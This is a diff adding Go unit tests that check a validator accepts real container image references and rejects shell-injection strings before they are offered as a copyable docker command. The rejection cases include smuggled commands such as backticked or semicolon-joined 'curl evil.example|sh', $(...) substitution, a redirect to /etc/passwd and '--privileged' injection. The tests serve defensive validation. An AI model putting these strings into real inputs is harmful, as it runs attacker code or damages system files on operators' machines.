@@ -197,3 +197,66 @@ func TestPublishedRunnerTagAcceptsWhatThisBuildHandsOut(t *testing.T) {
 		}
 	}
 }
+
+// An image reference is offered to an operator as the argument of a command
+// they will copy, and the pool's image is free text, so only what is shaped like
+// a reference may be put in one. Every reference the fleet uses has to pass, or
+// a failed pull would stop offering the one command that shows the daemon's own
+// answer.
+func TestEveryImageReferenceTheFleetUsesMayBeOfferedAsACommandArgument(t *testing.T) {
+	refs := []string{
+		"ubuntu",
+		"ubuntu:24.04",
+		"library/ubuntu:24.04",
+		"ghcr.io/eyupio/zoomies-runner:ubuntu-2404",
+		"registry.example.com:5000/team/runner:v1.2.3_rc1",
+		"localhost:5000/runner",
+		"ghcr.io/eyupio/zoomies-runner@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+		"ghcr.io/eyupio/zoomies-runner:latest@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+		"Registry.Example.com/Team/Runner:V1",
+	}
+	for _, img := range Images() {
+		refs = append(refs, img.Ref())
+	}
+	for _, ref := range refs {
+		if !IsImageReference(ref) {
+			t.Errorf("IsImageReference(%q) = false, want it offered", ref)
+		}
+	}
+}
+
+// Anything else would be copied into a shell, so each way text could break out
+// of a command or turn into a second one has to be refused: the one the UI
+// draws as a code span, the ones a shell reads, and a leading dash that docker
+// would take for an option of its own.
+func TestAnImageReferenceThatCouldBeMoreThanOneArgumentIsNotOfferedAsACommandArgument(t *testing.T) {
+	for _, c := range []struct{ name, ref string }{
+		{"nothing", ""},
+		{"only spaces", "   "},
+		{"a backtick pair around a command", "ghcr.io/a`curl evil.example|sh`b:1"},
+		{"a lone backtick", "ghcr.io/a`b"},
+		{"a semicolon", "ghcr.io/a:1;curl evil.example|sh"},
+		{"a pipe", "ghcr.io/a:1|sh"},
+		{"an ampersand", "ghcr.io/a:1&&sh"},
+		{"a command substitution", "ghcr.io/$(curl evil.example)"},
+		{"a variable", "ghcr.io/${HOME}"},
+		{"a redirect", "ghcr.io/a:1>/etc/passwd"},
+		{"a quote", "ghcr.io/a'b"},
+		{"a space", "ghcr.io/a:1 --privileged"},
+		{"a tab", "ghcr.io/a:1\t--privileged"},
+		{"a line break", "ghcr.io/a:1\ncurl evil.example"},
+		{"a leading space", " ghcr.io/a:1"},
+		{"a leading dash", "--help"},
+		{"a leading dot", ".hidden/a:1"},
+		{"a backslash", `ghcr.io\a`},
+		{"a wildcard", "ghcr.io/*"},
+		{"letters outside ASCII", "ghcr.io/büro:1"},
+		{"a reference too long to be one", strings.Repeat("a", 256)},
+	} {
+		t.Run(c.name, func(t *testing.T) {
+			if IsImageReference(c.ref) {
+				t.Errorf("IsImageReference(%q) = true, want it refused", c.ref)
+			}
+		})
+	}
+}
